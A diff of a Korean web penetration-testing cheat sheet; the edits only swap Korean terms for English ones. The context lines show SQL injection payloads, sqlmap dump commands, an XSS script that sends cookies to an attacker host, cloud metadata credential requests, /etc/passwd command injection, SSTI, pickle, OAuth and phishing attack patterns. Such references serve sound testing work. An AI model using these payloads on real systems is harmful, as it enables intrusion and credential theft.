@@ -12,12 +12,12 @@
 # Wappalyzer 대안 - whatweb
 whatweb <url>
 
-# HTTP 헤더 확인
+# HTTP header 확인
 curl -I <url>
 curl -v <url> 2>&1 | grep -i 'server\|x-powered\|x-aspnet'
 ```
 
-### 디렉토리 / 파일 열거
+### directory / 파일 열거
 
 ```bash
 # gobuster
@@ -33,7 +33,7 @@ ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.t
   -t 50 -mc 200,301,302,403
 ```
 
-### 서브도메인 열거
+### subdomain 열거
 
 ```bash
 # ffuf vhost
@@ -49,15 +49,15 @@ gobuster vhost -u <url> -w /usr/share/seclists/Discovery/DNS/subdomains-top1mill
 gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
 
-### 파라미터 Fuzzing
+### parameter Fuzzing
 
 ```bash
-# GET 파라미터
+# GET parameter
 ffuf -u '<url>?FUZZ=test' \
   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
   -fs <default_size>
 
-# POST 파라미터
+# POST parameter
 ffuf -u '<url>' -X POST -d 'FUZZ=test' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
@@ -71,7 +71,7 @@ ffuf -u '<url>' -X POST -d 'FUZZ=test' \
 ### 수동 테스트
 
 ```sql
-# 기본 테스트 페이로드
+# 기본 테스트 payload
 ' OR 1=1--
 " OR 1=1--
 ' OR '1'='1
@@ -103,7 +103,7 @@ sqlmap -u '<url>?id=1' --batch
 # POST 요청
 sqlmap -u '<url>' --data='user=admin&pass=test' --batch
 
-# 쿠키/헤더 포함
+# cookie/header 포함
 sqlmap -u '<url>?id=1' --cookie='session=abc123' --batch
 
 # 데이터 덤프
@@ -139,7 +139,7 @@ javascript:alert(1)
 게시판, 댓글, 프로필 등에 스크립트를 저장하여 다른 사용자가 해당 페이지 방문 시 실행되도록 한다.
 
 ```html
-<!-- 쿠키 탈취 -->
+<!-- cookie 탈취 -->
 <script>document.location='http://<attacker>/c?='+document.cookie</script>
 
 <!-- fetch로 전송 -->
@@ -186,9 +186,9 @@ http://[::1]:80
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
 
-# AWS IMDSv2 (토큰 필요)
+# AWS IMDSv2 (token 필요)
 curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
-# → 토큰을 받아서 아래처럼 사용
+# → token을 받아서 아래처럼 사용
 curl -s -H "X-aws-ec2-metadata-token: <TOKEN>" http://169.254.169.254/latest/meta-data/
 
 # GCP Metadata
@@ -317,7 +317,7 @@ c\at /etc/passwd
 ### 탐지
 
 ```text
-# 기본 탐지 페이로드
+# 기본 탐지 payload
 {{7*7}}       → 49이면 Jinja2/Twig
 ${7*7}        → 49이면 Freemarker/Velocity
 #{7*7}        → 49이면 Thymeleaf
@@ -468,9 +468,9 @@ print(base64.b64encode(pickle.dumps(Exploit())).decode())
 </form>
 ```
 
-!!! info "CSRF 토큰 우회"
-    - 토큰 값 제거 (파라미터 자체를 삭제)
-    - 다른 사용자의 토큰 재사용
+!!! info "CSRF token 우회"
+    - token 값 제거 (parameter 자체를 삭제)
+    - 다른 사용자의 token 재사용
     - HTTP method 변경 (POST → GET)
     - Content-Type 변경으로 preflight 우회
 
@@ -506,7 +506,7 @@ req.send();
 | `Access-Control-Allow-Origin: *` + credentials | 높음 |
 | Origin 반사 (요청 Origin 그대로 응답) | 높음 |
 | `null` Origin 허용 | 중간 |
-| 서브도메인 와일드카드 (`*.target.com`) | 중간 |
+| subdomain 와일드카드 (`*.target.com`) | 중간 |
 
 ---
 
@@ -517,7 +517,7 @@ req.send();
 GET /api/users/1001 → GET /api/users/1002
 
 # 수직적 권한 상승 (관리자 기능 접근)
-GET /admin/dashboard  # 일반 사용자 세션으로
+GET /admin/dashboard  # 일반 사용자 session으로
 POST /api/users/1001/role  # 권한 변경
 
 # UUID/GUID 예측 불가해 보여도 leak 가능
@@ -529,7 +529,7 @@ POST /api/users/1001/role  # 권한 변경
 # HTTP method 변경
 GET /api/users/1001 → PUT /api/users/1001 (body에 수정 데이터)
 
-# 파라미터 오염
+# parameter 오염
 GET /api/users?id=1001&id=1002
 ```
 
@@ -537,7 +537,7 @@ GET /api/users?id=1001&id=1002
 
 ## HTTP Request Smuggling
 
-`Content-Length`와 `Transfer-Encoding` 헤더 해석 차이를 악용.
+`Content-Length`와 `Transfer-Encoding` header 해석 차이를 악용.
 
 ```http
 # CL.TE (Front-end: Content-Length, Back-end: Transfer-Encoding)
@@ -610,9 +610,9 @@ for t in threads: t.join()
 
 ## OpenAPI/Swagger 열거
 
-REST API 사양이 노출되면 엔드포인트/스키마/권한 모델을 빠르게 파악 가능.
+REST API 사양이 노출되면 endpoint/스키마/권한 모델을 빠르게 파악 가능.
 
-### 흔한 엔드포인트
+### 흔한 endpoint
 
 ```text
 /swagger-ui.html
@@ -642,21 +642,21 @@ curl -s https://target.com/openapi.json | jq '.paths | keys[]'
 ### 악용 포인트
 
 - Try-It-Out 프록시: Origin 검증 부재 시 CSRF/SSRF 연계
-- 인증 미적용 엔드포인트: `/api/v1/*`와 `/api/v2/*` 혼재로 우회
-- 스키마 불일치: 서버 실제 파라미터와 문서 상 차이 → HPP/IDOR 유발
-- 넓은 CORS와 결합: 자바스크립트에서 토큰 포함 요청 가능 여부 확인
+- 인증 미적용 endpoint: `/api/v1/*`와 `/api/v2/*` 혼재로 우회
+- 스키마 불일치: 서버 실제 parameter와 문서 상 차이 → HPP/IDOR 유발
+- 넓은 CORS와 결합: 자바스크립트에서 token 포함 요청 가능 여부 확인
 
 ### 워크플로우
 
-1) 엔드포인트 탐지 → 2) 스키마 덤프 후 Postman/Insomnia 가져오기 → 3) 권한/경계 값 퍼징 → 4) 멱등성/RateLimit 검증 → 5) 비즈니스 로직 테스트
+1) endpoint 탐지 → 2) 스키마 덤프 후 Postman/Insomnia 가져오기 → 3) 권한/경계 값 퍼징 → 4) 멱등성/RateLimit 검증 → 5) 비즈니스 로직 테스트
 
 ---
 
 ## GraphQL 공격
 
-GraphQL 은 단일 엔드포인트(`/graphql`, `/api/graphql`, `/v1/graphql` 등) 에 다양한 쿼리/뮤테이션을 받기 때문에 권한 분리/Rate Limit 가 자주 깨짐.
+GraphQL 은 단일 endpoint(`/graphql`, `/api/graphql`, `/v1/graphql` 등) 에 다양한 쿼리/뮤테이션을 받기 때문에 권한 분리/Rate Limit 가 자주 깨짐.
 
-### 엔드포인트 식별
+### endpoint 식별
 
 ```bash
 # 흔한 경로 퍼징
@@ -697,7 +697,7 @@ clairvoyance -o schema.json http://TARGET/graphql -w wordlist.txt
 # directive 로 조건부 노출
 {"query":"query($x:Boolean!){ user(id:1) @include(if:$x){ email } }","variables":{"x":true}}
 
-# JWT/세션 헤더 변경하며 동일 mutation 반복 → IDOR 자동화
+# JWT/session header 변경하며 동일 mutation 반복 → IDOR 자동화
 ```
 
 ### Batching / Query Stacking
@@ -782,7 +782,7 @@ https://auth.target.com/authorize?
 # state 가 검증되지 않으면 공격자가 자기 OAuth flow 의 code 를 피해자 계정에 강제 연결
 1. 공격자가 IdP 로그인 → code 획득
 2. 피해자에게 https://app.target.com/oauth/callback?code=ATTACKER_CODE 클릭 유도
-3. 피해자 세션이 공격자 IdP 계정과 link 됨 → 공격자가 그 계정으로 로그인 가능
+3. 피해자 session이 공격자 IdP 계정과 link 됨 → 공격자가 그 계정으로 로그인 가능
 ```
 
 ### Authorization Code Injection / Replay
@@ -792,13 +792,13 @@ https://auth.target.com/authorize?
 - code 가 redirect_uri/client_id 와 바인딩되는지 (PKCE code_verifier)
 - code 만료 시간이 충분히 짧은지 (보통 60s)
 
-PKCE 미적용 모바일/SPA 클라이언트는 code 탈취만으로 토큰 교환 가능.
+PKCE 미적용 모바일/SPA 클라이언트는 code 탈취만으로 token 교환 가능.
 ```
 
 ### scope / audience confusion
 
 ```bash
-# 다른 클라이언트의 토큰을 우리 API 에 사용 (aud 미검증)
+# 다른 클라이언트의 token을 우리 API 에 사용 (aud 미검증)
 curl -H "Authorization: Bearer <other_client_token>" https://api.target.com/v1/me
 
 # scope 상승 - authorize 단계에서 추가 scope 요청
@@ -807,7 +807,7 @@ curl -H "Authorization: Bearer <other_client_token>" https://api.target.com/v1/m
 # Resource Server 에서 scope 검증 누락이면 추가 권한 획득
 ```
 
-### JWT 기반 토큰 공격
+### JWT 기반 token 공격
 
 상세는 [JWT 공격](#jwt-공격) 섹션 참고. 주요 포인트:
 
@@ -827,7 +827,7 @@ strings app.apk | grep -iE 'client_secret|api_key'
 ### Device Authorization Grant phishing
 
 ```text
-# device flow 코드를 피해자에게 전달 → 피해자가 본인 계정으로 승인 → 공격자가 폴링하던 토큰 획득
+# device flow 코드를 피해자에게 전달 → 피해자가 본인 계정으로 승인 → 공격자가 폴링하던 token 획득
 POST /device/code → user_code 입력 페이지 URL 을 피싱 메일로 전달
 ```
 
@@ -847,10 +847,10 @@ POST /device/code → user_code 입력 페이지 URL 을 피싱 메일로 전달
 ### 탐지/체크
 
 ```bash
-# 공통: 헤더/경로 변조 후 응답 캐시 여부 확인
+# 공통: header/경로 변조 후 응답 캐시 여부 확인
 curl -sI https://target.com/ | egrep -i 'age:|x-cache|via'
 
-# 파라미터 추가로 오리진 우회 (Vary 미설정)
+# parameter 추가로 오리진 우회 (Vary 미설정)
 curl -sI 'https://target.com/profile?cb=1'
 
 # 캐시 키 분리 실패 확인
@@ -862,7 +862,7 @@ curl -sI 'https://target.com/?callback=<script>alert(1)</script>'
 
 ### 방어 신호
 - `Cache-Control: private, no-store`, `Vary` 적절 설정
-- 경로 정규화/파라미터 화이트리스트
+- 경로 정규화/parameter 화이트리스트
 
 ---
 
@@ -874,7 +874,7 @@ curl -sI 'https://target.com/?callback=<script>alert(1)</script>'
 <iframe src="https://target.com/transfer" style="opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
 ```
 
-탐지: 응답 헤더에서 `X-Frame-Options` / `frame-ancestors` 확인.
+탐지: 응답 header에서 `X-Frame-Options` / `frame-ancestors` 확인.
 
 ---
 
@@ -883,7 +883,7 @@ curl -sI 'https://target.com/?callback=<script>alert(1)</script>'
 약한 정책(`unsafe-inline`, 넓은 `*.cdn.com`) 조합을 통한 우회.
 
 ```text
-# JSONP, callback 파라미터, trusted CDN JSON→JS 전환
+# JSONP, callback parameter, trusted CDN JSON→JS 전환
 # data:, blob:, filesystem: 스킴 허용 여부
 ```
 
@@ -893,7 +893,7 @@ curl -sI 'https://target.com/?callback=<script>alert(1)</script>'
 
 ## XSSI / postMessage / XS-Leaks
 
-- XSSI: JSON 엔드포인트에 `)]}',` 프리픽스 유무, `Content-Type: application/json` 강제
+- XSSI: JSON endpoint에 `)]}',` 프리픽스 유무, `Content-Type: application/json` 강제
 - postMessage: `event.origin` 검증 부재, 와일드카드 수신 여부
 - XS-Leaks: 타이밍/리다이렉트/리소스 크기 기반 정보 유출 가능성 점검
 
@@ -903,12 +903,12 @@ curl -sI 'https://target.com/?callback=<script>alert(1)</script>'
 
 ## 2FA/MFA/OTP Bypass 패턴
 
-- 세션 고정: 2FA 전·후 세션 토큰 불변 여부
+- session 고정: 2FA 전·후 session token 불변 여부
 - OTP 재사용/동시성: one-time 사용 보장, 중복 제출 거부
-- 백업코드/이메일 링크: 토큰 만료, 매체 변경 시 재검증
+- 백업코드/이메일 링크: token 만료, 매체 변경 시 재검증
 - 등록 흐름: 새 기기 등록에 비밀번호만 요구하는지 점검
 
-탐지 스크립트 예시(Burp/Turbo Intruder): 동일 요청을 토큰만 바꿔 동시 전송해 중복 사용 가능 여부 확인.
+탐지 스크립트 예시(Burp/Turbo Intruder): 동일 요청을 token만 바꿔 동시 전송해 중복 사용 가능 여부 확인.
 
 ---
 
